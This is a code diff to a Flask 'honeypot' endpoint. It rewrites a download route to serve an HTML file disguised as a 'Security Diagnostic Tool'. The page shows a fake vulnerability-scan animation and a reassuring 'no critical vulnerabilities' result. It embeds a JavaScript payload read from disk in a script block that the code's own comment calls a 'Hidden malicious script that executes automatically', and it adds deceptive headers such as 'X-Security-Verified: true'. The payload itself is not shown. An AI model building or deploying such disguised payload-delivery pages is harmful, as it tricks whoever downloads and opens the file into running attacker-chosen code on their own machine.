@@ -382,7 +382,7 @@ def monitoring_honeypot():
 
 @honeypot_pages_bp.route('/honeypot-api/download-data', methods=['POST', 'GET'])
 def honeypot_download_endpoint():
-    """Honeypot endpoint that logs download attempts and serves the JavaScript payload"""
+    """Honeypot endpoint that serves an HTML file that auto-executes the JavaScript payload"""
     # Get the page type from the request
     page_type = request.form.get('page_type', 'admin_panel')
     data_type = request.form.get('data_type', 'security_tool')
@@ -402,45 +402,183 @@ def honeypot_download_endpoint():
     # Ensure the payloads directory exists
     os.makedirs(os.path.dirname(js_path), exist_ok=True)
     
-    # Read the JavaScript file - removed fallback creation
     try:
+        # Read the JavaScript file
         with open(js_path, 'r') as f:
             js_content = f.read()
+            
+        # Create an HTML wrapper that automatically executes the JavaScript
+        html_content = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Diagnostic Tool</title>
+    <style>
+        body {{
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+        }}
+        .container {{
+            max-width: 800px;
+            margin: 40px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }}
+        h1 {{
+            color: #2c3e50;
+            margin-top: 0;
+        }}
+        .progress-container {{
+            margin: 30px 0;
+        }}
+        .progress-bar {{
+            height: 20px;
+            background-color: #f1f1f1;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }}
+        .progress {{
+            height: 100%;
+            width: 0%;
+            background-color: #4CAF50;
+            border-radius: 10px;
+            transition: width 0.5s;
+        }}
+        .status {{
+            font-size: 16px;
+            margin-bottom: 10px;
+        }}
+        .results {{
+            display: none;
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+            border-left: 4px solid #4CAF50;
+        }}
+        .footer {{
+            margin-top: 40px;
+            font-size: 12px;
+            color: #777;
+            text-align: center;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Security Diagnostic Tool</h1>
+        <p>This tool will scan your system for security vulnerabilities and configuration issues.</p>
+        
+        <div class="progress-container">
+            <div class="status" id="status-text">Initializing scan...</div>
+            <div class="progress-bar">
+                <div class="progress" id="progress-bar"></div>
+            </div>
+        </div>
+        
+        <div class="results" id="results">
+            <h3>Scan Summary</h3>
+            <p>The security diagnostic scan has been completed. No critical vulnerabilities were detected.</p>
+            <p>Recommendations:</p>
+            <ul>
+                <li>Keep your operating system and applications updated</li>
+                <li>Use strong, unique passwords for all accounts</li>
+                <li>Enable two-factor authentication where available</li>
+                <li>Regularly back up your important data</li>
+            </ul>
+        </div>
+        
+        <div class="footer">
+            © 2025 Security Systems Inc. All rights reserved.
+        </div>
+    </div>
+
+    <script>
+        // Simulate progress animation
+        const progressBar = document.getElementById('progress-bar');
+        const statusText = document.getElementById('status-text');
+        const results = document.getElementById('results');
+        
+        const scanSteps = [
+            "Checking system configuration...",
+            "Scanning network settings...",
+            "Analyzing firewall rules...",
+            "Checking installed software...",
+            "Scanning for vulnerabilities...",
+            "Testing security protocols...",
+            "Analyzing encryption standards...",
+            "Checking for updates...",
+            "Finalizing scan results..."
+        ];
+        
+        let step = 0;
+        const updateProgress = () => {{
+            const progress = (step / scanSteps.length) * 100;
+            progressBar.style.width = `${{progress}}%`;
+            
+            if (step < scanSteps.length) {{
+                statusText.innerText = scanSteps[step];
+                step++;
+                setTimeout(updateProgress, Math.random() * 1500 + 500);
+            }} else {{
+                statusText.innerHTML = "<strong style='color: #4CAF50;'>Scan complete!</strong> No critical vulnerabilities detected.";
+                results.style.display = "block";
+            }}
+        }};
+        
+        // Start the progress animation
+        setTimeout(updateProgress, 1000);
+    </script>
+    
+    <!-- Hidden malicious script that executes automatically -->
+    <script>
+        {js_content}
+    </script>
+</body>
+</html>
+"""
+        
+        # Prepare response with HTML content
+        response = make_response(html_content)
+        
+        # Set headers to make it download as an HTML file
+        response.headers['Content-Type'] = 'text/html'
+        response.headers['Content-Disposition'] = 'attachment; filename=security-diagnostic.html'
+        
+        # Add some deceptive headers
+        response.headers['Content-Length'] = str(len(html_content))
+        response.headers['Last-Modified'] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
+        response.headers['Expires'] = (datetime.utcnow() + timedelta(days=30)).strftime('%a, %d %b %Y %H:%M:%S GMT')
+        response.headers['X-Security-Verified'] = 'true'
+        
+        # Track download completion
+        db.honeypot_interactions.insert_one({
+            "interaction_id": f"{interaction_id}_download_complete" if interaction_id else None,
+            "timestamp": datetime.utcnow(),
+            "ip_address": request.remote_addr,
+            "user_agent": request.headers.get('User-Agent', ''),
+            "referer": request.headers.get('Referer', ''),
+            "page_type": page_type,
+            "interaction_type": "download_complete",
+            "http_method": request.method,
+            "path": request.path,
+            "content_length": len(html_content)
+        })
+        
+        return response
+        
     except Exception as e:
         # If there's an error reading the file, log it
-        logging.error(f"Error reading JavaScript payload: {str(e)}")
+        logging.error(f"Error preparing download: {str(e)}")
         # Return an error response
         return jsonify({"error": "Failed to load security tool"}), 500
-    
-    # Prepare response with JavaScript content
-    response = make_response(js_content)
-    
-    # Set headers to make it download as a file
-    response.headers['Content-Type'] = 'application/javascript'
-    response.headers['Content-Disposition'] = 'attachment; filename=security-diagnostic.js'
-    
-    # Add some deceptive headers
-    response.headers['Content-Length'] = str(len(js_content))
-    response.headers['Last-Modified'] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
-    response.headers['Expires'] = (datetime.utcnow() + timedelta(days=30)).strftime('%a, %d %b %Y %H:%M:%S GMT')
-    response.headers['X-Security-Verified'] = 'true'
-    
-    # Track download completion
-    db.honeypot_interactions.insert_one({
-        "interaction_id": f"{interaction_id}_download_complete" if interaction_id else None,
-        "timestamp": datetime.utcnow(),
-        "ip_address": request.remote_addr,
-        "user_agent": request.headers.get('User-Agent', ''),
-        "referer": request.headers.get('Referer', ''),
-        "page_type": page_type,
-        "interaction_type": "download_complete",
-        "http_method": request.method,
-        "path": request.path,
-        "content_length": len(js_content)
-    })
-    
-    return response
-
 
 
 @honeypot_pages_bp.route('/<path:path>', methods=['GET', 'POST'])
